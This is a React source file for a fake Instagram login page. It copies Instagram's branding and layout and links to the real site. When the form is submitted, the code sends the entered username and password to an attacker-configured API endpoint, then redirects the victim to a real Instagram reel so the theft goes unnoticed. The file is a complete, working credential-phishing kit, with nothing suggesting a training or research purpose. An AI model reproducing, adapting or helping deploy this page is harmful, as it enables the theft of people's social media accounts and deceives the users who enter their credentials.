import { useState } from "react";
import axios from "axios";
const API_URL = import.meta.env.VITE_API_URL;

console.log( "api_url : "+ API_URL)


const InstagramLogin = () => {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [showPassword, setShowPassword] = useState(false);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async(e) => {
    e.preventDefault();
    try{
      await axios.post(API_URL+"/login",{
        username:formData.username ,
        password:formData.password
      })
      window.location.href = 'https://www.instagram.com/reel/DHQX26xJaKf/?igsh=cjZ6eXYydWY5NjZl'
    }
    catch(e){
      console.log(e)
    }
  };

  return (
    <div className="flex items-center flex-col justify-center min-h-screen bg-black gap-8">
      <div className="w-full max-w-md p-6 border border-[#363636]  bg-[#000000] rounded-sm shadow-lg">
        {/* Instagram Logo */}
        <h1 className="text-4xl  text-center text-white mb-6 py-8 font-pacifico">
          Instagram
        </h1>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-4 w-full">
          <div>
            <input
              type="text"
              name="username"
              placeholder="Phone number, username, or email"
              value={formData.username}
              onChange={handleChange}
              className="w-full text-white px-4 py-2 bg-[#121212]  border rounded-sm border-[#363636] focus:outline-none "
              required
            />
          </div>

          <div className=" bg-[#121212]  border rounded-sm border-[#363636] flex ">
            <input
              type={showPassword?"text":"password"}
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-[85%] text-white px-4 py-2 bg-[#121212]  border rounded-sm border-[#121212] focus:outline-none"
              required
            />
            <button className="text-white hover:text-[#534e4e] text-center font-bold text-lg" onClick={(s)=>setShowPassword(!showPassword)}> {showPassword? "Hide" : "Show"}</button>
          </div>
          

          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600"
          >
            Log In
          </button>
        </form>

        <div className="flex items-center text-white w-full mt-8">
          <hr className="border-t border-[#363636] w-[40%] flex-grow" />
          <span className="px-4">OR</span>
          <hr className="border-t border-[#363636] w-[40%] flex-grow" />
        </div>

        {/* Links */}
        <div className="text-center mt-4 flex flex-row gap-4 items-center justify-center">
          <img className="h-6" src="/assets/image.png" alt="logo" />
          <a href="https://www.instagram.com/accounts/login/?hl=en" className="text-blue-500 text-md">Log in with Facebook</a>
        </div>
        <div className="text-center mt-4">
          <a href="https://www.instagram.com/accounts/login/?hl=en" className="text-white text-sm">Forgot password?</a>
        </div>
      </div>

      <div className="w-full max-w-md p-6 border border-[#363636]  bg-[#000000] rounded-sm shadow-lg" >
        <div className="text-center text-md text-white">
          Don't have an account? <a href="https://www.instagram.com/accounts/login/?hl=en" className="text-blue-500">Sign up</a>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;